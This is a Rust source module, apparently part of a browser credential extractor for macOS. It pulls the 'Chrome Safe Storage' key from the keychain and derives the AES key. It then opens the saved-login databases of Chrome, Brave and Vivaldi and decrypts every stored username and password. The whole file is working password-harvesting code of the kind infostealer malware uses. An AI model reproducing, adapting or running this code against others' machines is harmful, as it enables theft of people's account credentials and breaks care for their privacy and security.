use std::path::PathBuf;

use dirs::data_local_dir;

use aes::Aes128;

use block_modes::block_padding::Pkcs7;
use block_modes::{BlockMode, Cbc};

use crypto::hmac::Hmac;
use crypto::pbkdf2::pbkdf2;
use crypto::sha1::Sha1;

use security_framework::os::macos::keychain::SecKeychain;

use rusqlite::{Connection, OpenFlags};

use crate::browsers::Credential;
use crate::error::{ExtractorError, ExtractorResult};

type Aes128Cbc = Cbc<Aes128, Pkcs7>;

const KNOWN_BROWSER_PATHS: &[&str] = &[
    "Google/Chrome",
    // "Google/Chrome SxS",
    "BraveSoftware/Brave-Browser",
    "Vivaldi",
];

fn browser_directories() -> ExtractorResult<Vec<PathBuf>> {
    let local_data_dir = data_local_dir().ok_or(ExtractorError::CannotFindLocalDataDirectory)?;

    let mut existing_paths = Vec::new();

    for known_path in KNOWN_BROWSER_PATHS {
        let dir = local_data_dir.join(known_path);

        if dir.exists() {
            existing_paths.push(dir);
        }
    }

    Ok(existing_paths)
}

pub fn login_credentials() -> ExtractorResult<Vec<Credential>> {
    let mut credentials = Vec::new();

    let keychain = SecKeychain::default()?;

    let encryption_key = keychain
        .find_generic_password("Chrome Safe Storage", "Chrome")?
        .0
        .to_owned();

    // derived key is used to decrypt the encrypted data
    let mut dk = [0u8; 16];

    let mut mac = Hmac::new(Sha1::new(), &encryption_key);

    pbkdf2(&mut mac, b"saltysalt", 1003, &mut dk);

    let mut iv = [0u8; 16];

    // IV 16 bytes of space " "
    for i in 0..16 {
        iv[i] = b' ';
    }

    let cipher = Aes128Cbc::new_from_slices(&dk, &iv)?;

    for path in browser_directories()? {
        let login_data = Connection::open_with_flags(
            path.join(["Default", "Login Data"].iter().collect::<PathBuf>()),
            OpenFlags::SQLITE_OPEN_READ_ONLY | OpenFlags::SQLITE_OPEN_NO_MUTEX,
        )?;

        let mut stmt = login_data
            .prepare_cached("SELECT origin_url, username_value, password_value FROM logins")?;

        let mut rows = stmt.query([])?;

        while let Some(row) = rows.next()? {
            let origin_url = row.get::<_, String>(0)?;
            let username_value = row.get::<_, String>(1)?;
            let mut password_value = row.get::<_, Vec<u8>>(2)?;

            let decrypted_password = {
                if password_value.len() > 0 {
                    // Strip over "v10" versioning prefix
                    std::str::from_utf8(cipher.clone().decrypt(&mut password_value[3..])?)
                        .map_err(|_| ExtractorError::AESCBCCannotDecryptPassword)?
                        .to_owned()
                } else {
                    "".to_owned()
                }
            };

            credentials.push(Credential {
                url: origin_url,
                username: username_value,
                password: decrypted_password,
            });
        }
    }

    Ok(credentials)
}
